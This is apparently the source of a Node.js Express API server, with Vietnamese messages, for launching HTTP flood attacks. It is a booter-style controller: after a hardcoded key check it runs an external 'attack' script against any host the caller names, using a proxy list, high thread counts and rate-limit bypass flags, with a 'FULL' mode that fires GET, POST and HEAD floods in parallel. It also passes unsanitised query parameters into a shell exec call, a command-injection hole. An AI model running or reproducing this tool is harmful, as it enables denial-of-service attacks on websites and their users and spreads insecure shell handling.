const express = require("express"), { exec } = require("child_process");
const app = express(), port = 8080, MAX_CONCURRENT_ATTACKS = 1;
let activeAttacks = 0, currentPID = null;

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 300) return "THỜI GIAN PHẢI < 300S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command) => {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (stderr) {
        console.error(stderr);
        reject(stderr);
      } else {
        resolve(stdout);
      }
    });
  });
};

const executeAllAttacks = async (methods, host, time, threads, rate, modul, res) => {
  const commands = methods.map((method) => {
    return `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
  });

  try {
    // Thực thi tất cả các lệnh tấn công song song
    await Promise.all(commands.map(executeAttack));
    
    // Trả về phản hồi sau khi tất cả lệnh hoàn tất
    let message = modul === "FULL" ? "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI" : "LỆNH TẤN CÔNG ĐÃ GỬI";
    let modulInfo = modul === "FULL" ? "GET POST HEAD" : modul;  // Hiển thị các phương thức nếu modul là FULL

    res.status(200).json({ 
      status: "SUCCESS", 
      message, 
      host, 
      port, 
      time, 
      modul: modulInfo,  // Thêm modul vào trong phản hồi
      method: "attack",  // Giữ nguyên method là "attack"
      pid: currentPID 
    });
  } catch (error) {
    res.status(500).json({ status: "ERROR", message: "Lỗi trong quá trình tấn công", statusCode: 500 });
  }
};

app.get("/api/attack", async (req, res) => {
  const { key, host, time, method, port, modul, threads, rate } = req.query;
  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage)
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  activeAttacks++;

  currentPID = Math.floor(Math.random() * 10000) + 1;

  // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
  if (modul === "FULL") {
    const methods = ["GET", "POST", "HEAD"];
    await executeAllAttacks(methods, host, time, threads, rate, modul, res);
  } else {
    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
    await executeAttack(command);
    
    // Trả về phản hồi cho trường hợp không phải FULL
    let message = "LỆNH TẤN CÔNG ĐÃ GỬI";
    let modulInfo = modul;
    
    res.status(200).json({ 
      status: "SUCCESS", 
      message, 
      host, 
      port, 
      time, 
      modul: modulInfo,  // Thêm modul vào trong phản hồi
      method: "attack",  // Giữ nguyên method là "attack"
      pid: currentPID 
    });
  }

  activeAttacks--;
  currentPID = null;
});

app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
